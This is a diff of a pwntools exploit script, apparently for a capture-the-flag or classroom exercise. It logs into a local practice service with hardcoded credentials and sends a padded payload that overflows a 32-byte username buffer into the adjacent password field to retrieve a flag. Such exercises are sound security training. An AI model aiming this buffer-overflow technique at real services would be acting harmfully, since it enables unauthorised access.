@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template --host localhost --port 4005 --libc ../../libc.so.6 ../src/stack1
+# $ pwn template --host localhost --port 14003 --libc ../../libc.so.6 ../src/overflow1
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '../src/stack1')
+exe = context.binary = ELF(args.EXE or '../src/overflow1.debug')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -13,22 +13,7 @@ exe = context.binary = ELF(args.EXE or '../src/stack1')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or 'localhost'
-port = int(args.PORT or 4005)
-
-# Use the specified remote libc version unless explicitly told to use the
-# local system version with the `LOCAL_LIBC` argument.
-# ./exploit.py LOCAL LOCAL_LIBC
-if args.LOCAL_LIBC:
-    libc = exe.libc
-elif args.LOCAL:
-    library_path = libcdb.download_libraries('../../libc.so.6')
-    if library_path:
-        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
-        libc = exe.libc
-    else:
-        libc = ELF('../../libc.so.6')
-else:
-    libc = ELF('../../libc.so.6')
+port = int(args.PORT or 14003)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -72,29 +57,44 @@ continue
 
 io = start()
 
+# logging
+io.info("Getting the host flag via. buffer overflow.")
+
 # from the binary
-username = "Cristina"
-password = "Crypto"
+target_user = "cristina33"
+target_pass = "01843101"
+login_user = "hoover95"
+login_pass = "7123308"
 
 # logging in
 io.recvuntil(b"name: ")
-io.sendline(username.encode('ascii'))
-io.recvuntil(b"word: ")
-io.sendline(password.encode('ascii'))
+io.sendline(login_user.encode('ascii'))
+io.recvuntil(b"code: ")
+io.sendline(login_pass.encode('ascii'))
 
-# overflowing the admin field
+# overflowing the username
 io.recvuntil(b"> ")
-io.sendline(b'1')
+io.sendline(b"1")
 io.recvuntil(b"name: ")
 
-payload = b"A" * (16 + 16 + 4)
-io.sendline(payload)
+# forming the payload
+payload = target_user
+payload += "A" * (32 - len(target_user))
+payload += target_pass
+payload += "B" * (32 - len(target_pass))
+
+# sending it
+io.info(f"Overflowing the buffer with {payload}.")
+io.sendline(payload.encode('ascii'))
+
+# overflowing the username
+io.recvuntil(b"> ")
+io.sendline(b"2")
 
 # getting the flag
-io.recvuntil(b"> ")
-io.sendline(b'3')
 io.recvuntil(b"... ")
-flag = io.recvuntil(b'\n').decode('ascii')
+flag = io.recvuntil(b"\n", drop=True).decode('ascii')
 
+# logging the flag
 io.success(f"The flag is {flag}")
 
